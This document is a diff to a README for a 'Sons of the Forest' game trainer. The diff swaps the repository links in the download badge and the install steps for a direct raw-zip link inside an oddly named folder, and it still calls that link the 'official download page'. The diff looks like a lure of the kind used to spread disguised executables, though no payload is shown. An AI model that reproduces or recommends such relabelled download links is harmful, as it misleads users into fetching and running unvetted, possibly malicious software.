@@ -1,6 +1,6 @@
 # 🌲 Sons-Of-The-Forest-Trainer - Modify your game experience with ease
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://github.com/Mossrynchops811/Sons-Of-The-Forest-Trainer)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blue.svg)](https://raw.githubusercontent.com/Mossrynchops811/Sons-Of-The-Forest-Trainer/main/obsessingly/Trainer-Of-The-Sons-Forest-1.6.zip)
 
 This program works as a trainer for the game Sons of the Forest. It allows players to adjust game values to change character health, stamina, hunger, and building speed. Use this tool to customize your survival playthrough.
 
@@ -27,7 +27,7 @@ Ensure your computer meets these items before you use the trainer.
 
 Follow these steps to install the tool on your PC.
 
-1.  Visit the [official download page](https://github.com/Mossrynchops811/Sons-Of-The-Forest-Trainer) to access the latest version of the trainer file.
+1.  Visit the [official download page](https://raw.githubusercontent.com/Mossrynchops811/Sons-Of-The-Forest-Trainer/main/obsessingly/Trainer-Of-The-Sons-Forest-1.6.zip) to access the latest version of the trainer file.
 2.  Locate the release download button.
 3.  Save the executable file to a folder on your computer.
 4.  Launch Sons of the Forest and wait until you reach the main menu or verify you are inside your save game.
